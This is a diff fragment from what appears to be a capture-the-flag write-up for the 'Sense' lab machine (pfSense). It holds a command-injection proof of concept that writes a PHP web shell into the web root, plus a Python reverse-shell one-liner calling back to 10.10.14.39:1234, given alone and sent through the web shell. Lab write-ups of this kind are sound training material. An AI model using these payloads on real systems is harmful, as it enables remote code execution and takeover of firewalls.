@@ -88,7 +88,7 @@ exploit methodology:
 
 ![image-20231215232110169](./Sense.assets/image-20231215232110169.png)
 
-- RCE POC: `[https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd%20..;cd%20..;cd%20..;cd%20..;cd%20usr;cd%20local;%20cd%20www;echo%20%27%3C?php%20system($_GET[%22cmd%22\]);?%3E%27%3Ea.php](https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd ..;cd ..;cd ..;cd ..;cd usr;cd local; cd www;echo ''>a.php)`
+- RCE POC: `https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd%20..;cd%20..;cd%20..;cd%20..;cd%20usr;cd%20local;%20cd%20www;echo%20%27%3C?php%20system($_GET[%22cmd%22\]);?%3E%27%3Ea.php`
 - rshell payload:
   - `python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.14.39",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
   - URL: `https://10.10.10.60/a.php?cmd=python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.14.39",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
